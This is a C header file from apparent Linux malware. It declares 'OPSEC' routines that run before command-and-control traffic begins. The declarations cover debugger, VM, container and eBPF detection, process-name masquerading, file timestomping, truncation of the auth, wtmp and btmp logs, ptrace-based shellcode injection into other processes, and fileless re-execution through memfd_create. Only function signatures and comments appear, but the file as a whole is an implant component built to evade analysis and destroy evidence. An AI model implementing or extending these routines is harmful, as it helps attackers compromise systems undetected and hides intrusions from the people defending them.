#ifndef OPSEC_H
#define OPSEC_H

#include "types.h"

/// OPSEC checks -- anti-debug, VM detection, container detection, eBPF detection
/// Call opsec_check() at startup before any C2 communication.

/// Run all OPSEC checks. Returns 0 if safe, -1 if hostile environment detected.
int opsec_check(void);

/// Individual checks (can be called separately)
int opsec_anti_debug(void);       /* ptrace(TRACEME) + /proc/self/status TracerPid */
int opsec_vm_detect(void);        /* VM/hypervisor detection via CPUID / DMI */
int opsec_container_detect(void); /* cgroup v1/v2, /.dockerenv, namespace checks */
int opsec_ebpf_detect(void);      /* eBPF program enumeration (kprobes/tracepoints) */

/// Process masquerading — called at startup
/// Modifies /proc/self/comm and argv[0] to fake process name
void opsec_masquerade(const char *fake_name, char **argv);

/// Timestomping — modify file timestamps via utimensat syscall
/// ts_sec=0 means copy timestamps from reference_path
int opsec_timestomp(const char *path, long ts_sec);

/// Log evasion — truncate auth/wtmp/btmp logs (requires root)
int opsec_clean_logs(void);

/// Process injection via ptrace — inject + exec shellcode in target pid
int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len);

/// Fileless self-re-exec via memfd_create
/// Reads own binary from /proc/self/exe, creates anonymous fd, fexecve
int opsec_migrate_memfd(char **argv, char **envp);

#endif /* OPSEC_H */
